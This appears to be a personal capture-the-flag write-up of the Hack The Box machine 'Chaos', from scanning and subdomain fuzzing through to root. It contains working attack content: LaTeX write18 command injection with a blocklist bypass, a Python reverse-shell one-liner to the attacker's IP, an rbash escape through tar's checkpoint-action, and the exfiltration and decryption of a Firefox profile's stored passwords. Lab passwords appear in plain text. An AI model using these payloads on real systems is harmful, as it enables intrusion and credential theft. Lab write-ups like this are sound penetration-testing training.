+++

title = "CHAOS"

+++

chaos web server is hosting quite a few webpages. 10.10.10.120/wp/wordpress, chaos.htb, webmail.chaos.htb, chaos.htb:10000. Using wfuzz we find the subdomain. THERE IS A WAF INPLACE BLOCK ACCESSIVE LOGIN ETC

NMAP

not sure what 10000 really is most likely related 

```
nmap -sC -sV -oA nmap/initial chaos.htb -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:30 EST                                                                                      Nmap scan report for chaos.htb (10.10.10.120)
Host is up (0.046s latency).         
Not shown: 994 closed ports          
PORT      STATE SERVICE  VERSION       
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)      
|_http-title: Chaos                            
110/tcp   open  pop3     Dovecot pop3d                                                                                                              
|_pop3-capabilities: STLS TOP UIDL AUTH-RESP-CODE RESP-CODES PIPELINING SASL CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos  
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49           
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)                                                                                                     
|_imap-capabilities: ID more LITERAL+ STARTTLS OK listed post-login Pre-login IMAP4rev1 capabilities LOGIN-REFERRALS IDLE ENABLE have LOGINDISABLEDA0
001 SASL-IR                          
| ssl-cert: Subject: commonName=chaos  
| Subject Alternative Name: DNS:chaos  
| Not valid before: 2018-10-28T10:01:49           
|_Not valid after:  2028-10-25T10:01:49               
|_ssl-date: TLS randomness does not represent time                      
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)    
|_imap-capabilities: ID AUTH=PLAINA0001 more OK listed post-login Pre-login IMAP4rev1 LITERAL+ LOGIN-REFERRALS IDLE capabilities have ENABLE SASL-IR
| ssl-cert: Subject: commonName=chaos                                                                                                               
| Subject Alternative Name: DNS:chaos                       
| Not valid before: 2018-10-28T10:01:49 
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP UIDL AUTH-RESP-CODE RESP-CODES PIPELINING CAPA USER
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
nmap -p- -oA nmap/total-chaos chaos.htb -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 09:41 EST
Nmap scan report for chaos.htb (10.10.10.120)
Host is up (0.055s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
10000/tcp open  snet-sensor-mgmt
```

```
nmap -sU -T4 udp-chaos chaos.htb 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 11:22 EST
Failed to resolve "udp-chaos".
Warning: 10.10.10.120 giving up on port because retransmission cap hit (6).
Nmap scan report for chaos.htb (10.10.10.120)
Host is up (0.040s latency).
Not shown: 964 closed ports, 35 open|filtered ports
PORT      STATE SERVICE
10000/udp open  ndmp
```

+++

## GOBUSTER

enumerated all the known webpages

http://10.10.10.120

```
/wp (Status: 301)
	/wordpress
		/index.php (Status: 301)
		/wp-content (Status: 301)
		/wp-login.php (Status: 200)
		/wp-includes (Status: 301)
		/wp-trackback.php (Status: 200)
		/wp-admin (Status: 301)
		/wp-signup.php (Status: 302)
/javascript (Status: 301)

```

http://chaos.htb

```
/index.html (Status: 200)
/contact.html (Status: 200)
/about.html (Status: 200)
/blog.html (Status: 200)
/img (Status: 301)
/css (Status: 301)
/source (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/hof.html (Status: 200)
```

https://chaos.htb:10000 	NOTHING

+++

### WFUZZ - subdomains

Fails

```
wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u "http://FUZZ.chaos.htb:10000" -t 42
-f filename,printer       : Store results in the output file using the specified printer (raw printer if omitted).
-H "Host: FUZZ.10.10.10.120"
```

```
wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Dis
covery/DNS/subdomains-top1mil-5000.txt -u "http://10.10.10.120" -H "Host: FUZZ.10.10.10.120"
-t 42 --hc 400
i also fuzzed /wp/wordpress
```

```
wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u "http://FUZZ.chaos.htb:10000" -t 42                     
```

Mild success

```
wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Di$
covery/DNS/subdomains-top1mil-5000.txt -u "http://chaos.htb/wp/wordpress" -H "Host: FUZZ.cha$
s.htb" -t 42 --hc 400       

000003:  C=301      9 L       28 W          333 Ch        "localhost"
000004:  C=403     11 L       32 W          304 Ch        "webmail"
000005:  C=301      9 L       28 W          323 Ch        "smtp"
```

Sucess

```
wfuzz -c -f sub-chaos -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u "http://chaos.htb" -H "Host: FUZZ.chaos.htb" -t 42 --hl 1   

000004:  C=200    120 L      386 W         5607 Ch        "webmail"
```

![wfuzz2](C:/Users/charl/OneDrive/Pictures/hackthebox/chaos/wfuzz2.PNG)

+++

WEBAPP'S

1)![wp-10.10.10.120-0](C:\Users\charl\OneDrive\Pictures\hackthebox\chaos\wp-10.10.10.120-0.PNG)

2)chaos.htb

![webpage-hof](C:\Users\charl\OneDrive\Pictures\hackthebox\chaos\webpage-hof.PNG)

3)10.10.10.120/wp/wordpress 	#we found this using gobuster initially

here we will find the credentials for webmail(roundcube)		# password : human

![wp-10.10.10.120](C:\Users\charl\OneDrive\Pictures\hackthebox\chaos\wp-10.10.10.120.PNG)

![wp-10.10.10.120-5](C:\Users\charl\OneDrive\Pictures\hackthebox\chaos\wp-10.10.10.120-5.PNG)

4) webmail.chaos.htb	# enter the above creds into the login protal

​	#Then navigate to drafts and download the attachments

![webmail](C:\Users\charl\OneDrive\Pictures\hackthebox\chaos\webmail.PNG)

![webmail2](C:\Users\charl\OneDrive\Pictures\hackthebox\chaos\webmail2.PNG)

+++

HYDRA	# THERE IS A WAF INPLACE that's why we see direct ip not allowed and our brute forcing attempts are blocked.

+++

DECRYPTING	https://github.com/argosk/encrypt-Python	#  To decrypt this file i used a python script i found on github it will ask you for to either encrpt for decrypt a file then select a file. eneter the key to de or en crypt the file. in the email we are told the password is our name. we are addressed as sahay. 

![decrypt-file](decrypt-file.PNG)

```
#python script.py password file
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```

+++

## J00_w1ll_f1Nd_n07H1n9_H3r3

Finally we're we need to be for the joooooice! we find out selve on a little web app that makes pdf's for some kind of firm that puts the header to make official on the pdf. The input isn't properly sanatized we can use. this app uses latex to structure and build the documents submited into the desired format. we are interested in the ability to run commands/ 

after some expierentation i found what i need to get rce. 

1)

![final-webpage](final-webpage.PNG)

2) playing around with burp![final-webpage-black-list](final-webpage-black-list.PNG)

3) when it is base64 encoded is bypass bypass restrictions. webapp can read base64 soemthing that b missed![final-webpage-black-list-b64](final-webpage-black-list-b64.PNG)

4)After some time found what i needed to get rce. 

```
\immediate\write18{CMD GOES HERE}
```

5) We can script it in to encode it b64![final-webpage3](final-webpage3.PNG)

6)i used python to get a rshell. 0xdf used rm/nc

### python reverse shell -- success

```
content=\immediate\write18{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.159",9080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > chickenp.sh|base64 > chickenp.sh}

\newread\file

\openin\file=chickenp.sh

\loop\unless\ifeof\file

\read\file to\fileline

\text{\fileline}

\repeat

\closein\file

Run1

&template=test3
```

![shell](shell.PNG)

![shells-success](shells-success.PNG)

+++

USER & ROOT

First thing's first figure out who am i. www-data use su to switch to ayush use the same password. then using the tarwild card technique we will get root. 

LinEnum

```
[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.10
DISTRIB_CODENAME=cosmic
DISTRIB_DESCRIPTION="Ubuntu 18.10"
NAME="Ubuntu"
VERSION="18.10 (Cosmic Cuttlefish)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.10"
VERSION_ID="18.10"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=cosmic
UBUNTU_CODENAME=cosmic

```

Su ayush

username – ayush

password – jiujitsu

EXPORT

export -p to view the shell resitrictions this shows all the read only. declare -rx PATH="/home/ayush/.app" declare -rx SHELL="/opt/rbash"

```
export -p
declare -x APACHE_LOCK_DIR="/var/lock/apache2"
declare -x APACHE_LOG_DIR="/var/log/apache2"
declare -x APACHE_PID_FILE="/var/run/apache2/apache2.pid"
declare -x APACHE_RUN_DIR="/var/run/apache2"
declare -x APACHE_RUN_GROUP="www-data"
declare -x APACHE_RUN_USER="www-data"
declare -x HOME="/home/ayush"
declare -x INVOCATION_ID="df9e05d0804e4d1da0747f6120c01317"
declare -x JOURNAL_STREAM="9:19877"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="ayush"
declare -x MAIL="/var/mail/ayush"
declare -x OLDPWD="/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile"
declare -rx PATH="/home/ayush/.app"
declare -x PWD="/home"
declare -x SELFAUTODIR="/usr"
declare -x SELFAUTOGRANDPARENT="/"
declare -x SELFAUTOLOC="/usr/bin"
declare -x SELFAUTOPARENT="/"
declare -rx SHELL="/opt/rbash"
declare -x SHLVL="2"
declare -x USER="ayush"
declare -x XDG_RUNTIME_DIR="/run/user/1001"
declare -x XDG_SESSION_ID="c4"
declare -x engine="pdftex"
declare -x progname="pdflatex"

```

```
export SHELL="/bin/bash"
export SHELL="/bin/bash"
rbash: SHELL: readonly variable
export USER="WWW-DATA" =fail

echo $PATH returns /home/ayush/.app

echo os.system("/bin/bash")
echo os.system"/bin/bash"

python -c "import os; os.system('cp');"

cannot redirect output
cd is restricted
can't use /
tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
access to tar

tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/ls
/bin/cat


```

ESCAPE FROM AYUSH JAIL

Escaping from this jail was pretty tough because none of the basic techiquies worked for me. 
Able to use the tar wild card method to generate a shell. i believe this is a easter egg to tartarsauce.

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

BEYOND THE ESCAPE

upgrading tty to something easier to use, 

```
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

next step transfer off mail

```
/usr/bin/python -m SimpleHTTPServer 9030
/usr/bin/wget http://10.10.14.14:9030/LinEnum.sh  
```



```
inside mail directory i felt
/bin/ls -la
/bin/ls -la
total 20
drwx------ 3 ayush ayush 4096 Oct 28 12:17 .
drwx------ 6 ayush ayush 4096 Feb 11 03:37 ..
-rw------- 1 ayush ayush 2638 Oct 28 12:16 Drafts
drwx------ 5 ayush ayush 4096 Oct 28 12:13 .imap
-rw------- 1 ayush ayush    0 Oct 28 12:10 Sent
-rw------- 1 ayush ayush   17 Oct 28 12:13 .subscriptions
```

```
/bin/ls -la
total 32
drwx------ 5 ayush ayush 4096 Oct 28 12:13 .
drwx------ 3 ayush ayush 4096 Oct 28 12:17 ..
-rw------- 1 ayush ayush 4028 Oct 28 12:16 dovecot.list.index.log
-rw------- 1 ayush ayush   48 Oct 28 12:13 dovecot.mailbox.log
-rw------- 1 ayush ayush    8 Oct 28 12:13 dovecot-uidvalidity
-r--r--r-- 1 ayush ayush    0 Oct 28 12:10 dovecot-uidvalidity.5bd5a723
drwx------ 2 ayush ayush 4096 Oct 28 12:13 Drafts
drwx------ 2 ayush ayush 4096 Oct 28 12:10 INBOX
drwx------ 2 ayush ayush 4096 Oct 28 12:10 Sent
```

Find Suin perms

```
/usr/bin/find / -user root -perm -4000 -print 2>/dev/null

/ -user root -perm -4000 -print 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/bin/ntfs-3g
/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
```

```
/usr/bin/sudo -l
[sudo] password for ayush: jiujitsu

Sorry, user ayush may not run sudo on chaos.
```

not sure why i didn't check the default directory fully first.

```
/bin/ls -la
total 40
drwx------ 6 ayush ayush 4096 Feb 11 21:46 .
drwxr-xr-x 4 root  root  4096 Oct 28 11:34 ..
drwxr-xr-x 2 root  root  4096 Oct 28 12:25 .app
-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28 11:34 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28 12:27 .bashrc
drwx------ 3 ayush ayush 4096 Feb 11 03:37 .gnupg
drwx------ 3 ayush ayush 4096 Oct 28 12:17 mail
drwx------ 4 ayush ayush 4096 Sep 29 12:09 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28 11:34 .profile
-rw------- 1 ayush ayush   33 Oct 28 12:54 user.txt
```

.APP

```
lrwxrwxrwx 1 root  root     8 Oct 28 12:25 dir -> /bin/dir
		/bin/dir -a
			.  ..  ayush  sahay

lrwxrwxrwx 1 root  root     9 Oct 28 12:25 ping -> /bin/ping
lrwxrwxrwx 1 root  root     8 Oct 28 12:25 tar -> /bin/tar
```

FIREFOX

```
drwx------ 2 ayush ayush 4096 Sep 29 12:09 extensions
drwx------ 4 ayush ayush 4096 Sep 29 12:09 firefox
```

```
drwx------ 10 ayush ayush   4096 Feb 12 02:25  bzo7sjt1.default
drwx------  4 ayush ayush   4096 Oct 15 03:59 'Crash Reports'
-rw-r--r--  1 ayush ayush    104 Sep 29 12:09  profiles.ini
-rw-rw-r--  1 ayush ayush 716752 Feb 12 03:16  user.zip
```

Root

I used zip to compress the mozilla profile and used a github decryptor to get the login creds. transfering bzo7sjt1.default to my system was tricky and compressing it.by default i went to tar but i was getting some kind of error where tar was truncating itsself. there are ways to force / bypass. Zip came to the rescue.

https://github.com/unode/firefox_decrypt

```
/usr/bin/zip user.zip bzo7sjt1.default/* 
/usr/bin/python -m SimpleHTTPServer 9017
```

```
python firefox_decrypt/firefox_decrypt.py bzo7sjt1.default/
2019-02-11 22:28:36,944 - WARNING - profile.ini not found in bzo7sjt1.default/ 
2019-02-11 22:28:36,944 - WARNING - Continuing and assuming 'bzo7sjt1.default/'
is a profile location

Master Password for profile bzo7sjt1.default/:

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'

```

So log back in and su root and enter the password.